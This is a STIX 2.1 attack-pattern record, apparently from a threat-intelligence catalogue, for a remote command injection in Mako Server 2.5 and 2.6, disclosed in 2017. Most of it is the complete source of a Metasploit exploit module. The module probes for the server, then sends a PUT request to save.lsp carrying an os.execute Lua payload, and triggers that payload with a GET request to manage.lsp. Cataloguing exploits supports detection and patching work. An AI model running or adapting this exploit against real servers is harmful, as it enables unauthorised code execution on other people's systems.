{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f0a54af5-f46b-4cee-9ffc-f4e7c97af392",
    "created": "2024-08-14T17:09:08.160949Z",
    "modified": "2024-08-14T17:09:08.160953Z",
    "name": "Mako Server v2.5, 2.6 OS Command Injection RCE",
    "description": " This module exploits a vulnerability found in Mako Server v2.5, 2.6. It's possible to inject arbitrary OS commands in the Mako Server tutorial page through a PUT request to save.lsp.  Attacker input will be saved on the victims machine and can be executed by sending a GET request to manage.lsp.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/makoserver_cmd_exec.rb",
            "external_id": "makoserver_cmd_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.securiteam.com/index.php/archives/3391"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mako Server v2.5, 2.6 OS Command Injection RCE',\n      'Description'    => %q{\n        This module exploits a vulnerability found in Mako Server v2.5, 2.6.\n        It's possible to inject arbitrary OS commands in the Mako Server\n        tutorial page through a PUT request to save.lsp.\n\n        Attacker input will be saved on the victims machine and can\n        be executed by sending a GET request to manage.lsp.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'John Page (hyp3rlinx) - Beyond Security SecuriTeam Secure Disclosure', # Vulnerability discovery & PoC\n          'Steven Patterson (Shogun Lab) <steven[at]shogunlab.com>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['EDB', '42683'],\n          ['URL', 'https://blogs.securiteam.com/index.php/archives/3391']\n        ],\n      'Arch'           => ARCH_CMD,\n      'Platform' => %w[win unix],\n      'Targets'        =>\n        [\n          ['Mako Server v2.5, 2.6', {}]\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => false,\n      'DisclosureDate' => '2017-09-03'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'URI path to the Mako Server app', '/'])\n      ]\n    )\n  end\n\n  def check\n    vprint_status('Trying to detect running Mako Server and necessary files...')\n\n    # Send GET request to determine existence of save.lsp page\n    res = send_request_cgi({\n             'method' => 'GET',\n             'uri'    => normalize_uri(target_uri.path, 'examples/save.lsp')\n           }, 20)\n\n    # If response does not include \"MakoServer.net\", target is not viable.\n    if res.headers['Server'] !~ /MakoServer\\.net/\n      vprint_warning('Target is not a Mako Server.')\n      return CheckCode::Safe\n    end\n\n    if res.body\n      if res.body.include?('Incorrect usage')\n        # We are able to determine that the server has a save.lsp page and\n        # returns the correct output.\n        vprint_status('Mako Server save.lsp returns correct ouput.')\n        return CheckCode::Appears\n      else\n        # The page exists, but is not returning the expected output.\n        # May be a different version?\n        vprint_warning('Mako Server save.lsp did not return expected output.')\n        return CheckCode::Detected\n      end\n    else\n      # The above checks failed and exploitability could not be determined.\n      vprint_error('Unable to determine exploitability, save.lsp not found.')\n      return CheckCode::Unknown\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    print_status('Sending payload to target...')\n\n    # The double square brackets helps to ensure single/double quotes\n    # in cmd payload do not interfere with syntax of os.execute Lua function.\n    cmd = %{os.execute([[#{payload.encoded}]])}\n\n    # If users want to troubleshoot their cmd payloads, they can see the\n    # Lua function with params that the module uses in a more verbose mode.\n    vprint_status(\"Now executing the following command: #{cmd}\")\n\n    # Send a PUT request to save.lsp with command payload\n    begin\n      vprint_status('Sending PUT request to save.lsp...')\n      send_request_cgi({\n         'method'   => 'PUT',\n         'uri'      => normalize_uri(target_uri.path, 'examples/save.lsp'),\n         'ctype'    => 'text/plain',\n         'data'     => cmd,\n         'vars_get' => {\n           'ex' => '2.1'\n         }\n       }, 20)\n    rescue StandardError => e\n      fail_with(Failure::NoAccess, \"Error: #{e}\")\n    end\n\n    # Send a GET request to manage.lsp with execute set to true\n    begin\n      vprint_status('Sending GET request to manage.lsp...')\n      send_request_cgi({\n         'method'   => 'GET',\n         'uri'      => normalize_uri(target_uri.path, 'examples/manage.lsp'),\n         'vars_get' => {\n           'execute' => 'true',\n           'ex' => '2.1',\n           'type' => 'lua'\n         }\n       }, 20)\n    rescue StandardError => e\n      fail_with(Failure::NoAccess, \"Error: #{e}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-09-03",
    "x_mitre_platforms": [
        "%w[win unix]"
    ]
}